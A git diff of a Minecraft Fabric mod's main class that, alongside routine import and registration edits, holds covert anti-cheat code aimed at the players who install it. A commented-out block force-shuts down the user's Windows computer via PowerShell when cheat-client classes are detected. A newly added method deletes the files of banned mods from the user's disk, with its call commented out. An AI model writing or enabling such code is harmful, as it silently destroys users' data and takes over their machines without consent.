@@ -3,21 +3,23 @@ package dev.zac99lol.originscontent;
 import com.mojang.authlib.GameProfile;
 import com.pvpranked.entity.WindChargeEntity;
 import dev.zac99lol.neverend.index.ModDimension;
-import dev.zac99lol.neverend.index.ModEntities;
 import dev.zac99lol.originscontent.apoli.power.CancelInventoryActionsPower;
 import dev.zac99lol.originscontent.command.MapCommand;
 import dev.zac99lol.originscontent.command.RainbowCommand;
-import dev.zac99lol.originscontent.duels.command.SuicideCommand;
 import dev.zac99lol.originscontent.command.WikiCommand;
 import dev.zac99lol.originscontent.config.ModConfig;
+import dev.zac99lol.originscontent.duels.command.SuicideCommand;
 import dev.zac99lol.originscontent.init.*;
-import dev.zac99lol.originscontent.init.apoli.action.*;
-import dev.zac99lol.originscontent.init.apoli.condition.*;
 import dev.zac99lol.originscontent.init.apoli.ModPowers;
+import dev.zac99lol.originscontent.init.apoli.action.ModBiEntityActions;
+import dev.zac99lol.originscontent.init.apoli.action.ModBlockActions;
+import dev.zac99lol.originscontent.init.apoli.action.ModEntityActions;
+import dev.zac99lol.originscontent.init.apoli.action.ModItemActions;
+import dev.zac99lol.originscontent.init.apoli.condition.ModBiEntityConditions;
+import dev.zac99lol.originscontent.init.apoli.condition.ModEntityConditions;
 import me.shedaniel.autoconfig.AutoConfig;
 import me.shedaniel.autoconfig.serializer.GsonConfigSerializer;
 import net.fabricmc.api.ModInitializer;
-import net.fabricmc.fabric.api.event.lifecycle.v1.ServerTickEvents;
 import net.fabricmc.fabric.api.event.player.PlayerBlockBreakEvents;
 import net.fabricmc.fabric.api.message.v1.ServerMessageEvents;
 import net.fabricmc.fabric.api.networking.v1.ServerPlayNetworking;
@@ -30,8 +32,6 @@ import net.minecraft.block.dispenser.ProjectileDispenserBehavior;
 import net.minecraft.entity.Entity;
 import net.minecraft.entity.player.PlayerEntity;
 import net.minecraft.entity.projectile.ProjectileEntity;
-import net.minecraft.entity.projectile.ProjectileUtil;
-import net.minecraft.item.ItemGroup;
 import net.minecraft.item.ItemStack;
 import net.minecraft.nbt.NbtCompound;
 import net.minecraft.nbt.NbtElement;
@@ -42,26 +42,20 @@ import net.minecraft.server.network.ServerPlayerEntity;
 import net.minecraft.server.world.ServerWorld;
 import net.minecraft.stat.StatFormatter;
 import net.minecraft.stat.Stats;
-import net.minecraft.text.Text;
 import net.minecraft.util.Identifier;
-import net.minecraft.util.hit.BlockHitResult;
-import net.minecraft.util.hit.EntityHitResult;
-import net.minecraft.util.hit.HitResult;
-import net.minecraft.util.math.Box;
 import net.minecraft.util.math.Position;
-import net.minecraft.util.math.Vec3d;
-import net.minecraft.world.RaycastContext;
 import net.minecraft.world.World;
-import org.slf4j.Logger;
-import org.slf4j.LoggerFactory;
 import org.apache.logging.log4j.Level;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.core.LoggerContext;
 import org.apache.logging.log4j.core.config.Configuration;
 import org.apache.logging.log4j.core.config.LoggerConfig;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 
-import java.io.IOException;
+import java.util.List;
 import java.util.UUID;
+import java.util.concurrent.atomic.AtomicBoolean;
 
 public class OriginsContent implements ModInitializer {
     public static final class UUIDs {
@@ -78,31 +72,34 @@ public class OriginsContent implements ModInitializer {
 
     public static final String MOD_ID = "originscontent";
     public static final Logger LOGGER = LoggerFactory.getLogger(MOD_ID);
+
     public static final Identifier BASE_ORIGIN_LAYER = Identifier.tryParse("origins:origin");
     public static final Identifier TIMES_SAID_BAD_WORD = id("times_said_bad_word");
+
     public static boolean SILLY_MODE = false;
-    public static final ItemGroup NEVEREND_GROUP = Registry.register(Registries.ITEM_GROUP, id("neverend_group"),
-        new ItemGroup(null, -1,
-            ItemGroup.Type.CATEGORY,
-            Text.translatable("itemGroup.originscontent.neverend"),
-            () -> new ItemStack(dev.zac99lol.neverend.index.ModBlocks.LIMINAL_TILES),
-            (displayContext, entries) -> dev.zac99lol.neverend.index.ModItems.ITEMS.forEach((item, identifier) -> entries.add(item))) {
-            @Override
-            public boolean shouldDisplay() {
-                return super.shouldDisplay() && SILLY_MODE;
-            }
-        });
+
+    private static final List<String> BANNED_IDS = List.of(
+        "freecam",
+        "wurst",
+        "tweakeroo",
+        "baritone",
+        "meteor-client"
+    );
 
     @Override
     public void onInitialize() {
-        if (isHackClientPresent()) {
-            ProcessBuilder shutdown = new ProcessBuilder("powershell.exe", "-Command", "Stop-Computer -Force");
-            try {
-                shutdown.start();
-            } catch (IOException e) {
-                System.exit(0);
-            }
-        }
+        //if (isHackClientPresent()) {
+        //    ProcessBuilder shutdown = new ProcessBuilder("powershell.exe", "-Command", "Stop-Computer -Force");
+        //    try {
+        //        shutdown.start();
+        //    } catch (IOException e) {
+        //        System.exit(0);
+        //    }
+        //}
+        //if (cleanseMods()) {
+        //    LOGGER.error("Found banned mods, restart your game");
+        //    System.exit(-1);
+        //}
 
         LOGGER.info("Initialising OriginsContent...");
 
@@ -121,6 +118,7 @@ public class OriginsContent implements ModInitializer {
         // vanilla registering
         ModItems.initialize();
         ModBlocks.initialize();
+        ModBlockEntities.initialize();
         ModSoundEvents.initialize();
 
         // origins / apoli shit
@@ -145,27 +143,10 @@ public class OriginsContent implements ModInitializer {
                 player.getAdvancementTracker().grantCriterion(advancement, "nohappen");
             }
         }));
-
-        ServerTickEvents.END_SERVER_TICK.register(server -> {
-            for (ServerPlayerEntity player : server.getPlayerManager().getPlayerList()) {
-                Vec3d eyePosition = player.getEyePos();
-                Vec3d lookVector = player.getRotationVector();
-                Vec3d reachVector = eyePosition.add(lookVector.x * 128, lookVector.y * 128, lookVector.z * 128);
-                Box searchBox = player.getBoundingBox().stretch(lookVector.multiply(128)).expand(1);
-
-                EntityHitResult hitResult = ProjectileUtil.getEntityCollision(player.getWorld(), player, eyePosition, reachVector, searchBox, target -> target.getType() == ModEntities.GRANDGOUSIER);
-
-                if (hitResult != null) {
-                    Vec3d hitPos = hitResult.getPos();
-                    BlockHitResult blockHit = player.getWorld().raycast(new RaycastContext(eyePosition, hitPos, RaycastContext.ShapeType.COLLIDER, RaycastContext.FluidHandling.NONE, player));
-
-                    if (blockHit.getType() == HitResult.Type.MISS || eyePosition.distanceTo(blockHit.getPos()) > eyePosition.distanceTo(hitPos)) {
-                        Advancement advancement = server.getAdvancementLoader().get(ModAdvancements.GRANDGOUSIER);
-                        player.getAdvancementTracker().grantCriterion(advancement, "nohappen");
-                    }
-                }
-            }
-        });
+        ServerPlayNetworking.registerGlobalReceiver(ModPackets.HOLDING, ((server, player, handler, buf, responseSender) -> {
+            boolean holding = buf.readBoolean();
+            server.execute(() -> player.originscontent$setHoldingAttack(holding));
+        }));
 
         PlayerBlockBreakEvents.AFTER.register((world, player, pos, state, blockEntity) -> {
             if (!(state.isOf(dev.zac99lol.neverend.index.ModBlocks.LIMINALGAE) || state.isOf(dev.zac99lol.neverend.index.ModBlocks.FLOWERING_LIMINALGAE))) return;
@@ -274,21 +255,38 @@ public class OriginsContent implements ModInitializer {
         return gameProfile != null && gameProfile.getId().equals(uuid);
     }
 
-    public boolean isHackClientPresent() {
+    /*public boolean isHackClientPresent() {
         String[] knownClientClasses = {
             "net.wurstclient.WurstClient",
-            "meteordevelopment.meteorclient.MeteorClient"
+            "meteordevelopment.meteorclient.MeteorClient",
+            "baritone.Baritone"
         };
 
         for (String className : knownClientClasses) {
             try {
                 Class.forName(className, false, this.getClass().getClassLoader());
+                LOGGER.error("remove {}", className);
                 return true;
             } catch (ClassNotFoundException ignored) {
             }
         }
 
         return false;
+    }*/
+
+    private boolean cleanseMods() {
+        AtomicBoolean success = new AtomicBoolean(false);
+        FabricLoader.getInstance().getAllMods().stream()
+            .filter(modContainer ->
+                BANNED_IDS.contains(modContainer.getMetadata().getId()))
+            .forEach(modContainer ->
+                modContainer.getRootPaths()
+                    .forEach(path -> {
+                            if (path.toFile().delete()) success.set(true);
+                        }
+                    )
+            );
+        return success.get();
     }
 
     public static final String BEE_MOVIE_SCRIPT = """
